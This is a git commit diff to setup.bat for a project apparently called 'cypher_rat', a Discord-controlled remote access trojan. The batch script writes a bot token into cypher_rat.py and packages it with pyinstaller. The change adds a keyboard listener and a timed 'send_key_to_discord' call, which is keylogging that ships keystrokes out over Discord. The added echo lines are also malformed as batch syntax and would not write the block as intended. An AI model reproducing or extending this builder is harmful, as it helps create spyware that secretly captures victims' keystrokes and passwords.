11d3f7024b288498d91ee4d24eea135f99007a54
Pluraleve <139731152+PluralEve@users.noreply.github.com>
2023-08-01 23:42:01 +0530

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -6,6 +6,8 @@ pause
 
 set /p user_input=Enter the token:
 echo TOKEN = '%user_input%' >> cypher_rat.py
-echo bot.run(TOKEN) >> cypher_rat.py
+echo with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    threading.Timer(15.0, send_key_to_discord).start()
+    bot.run(TOKEN) >> cypher_rat.py
 
 pyinstaller --onefile cypher_rat.py
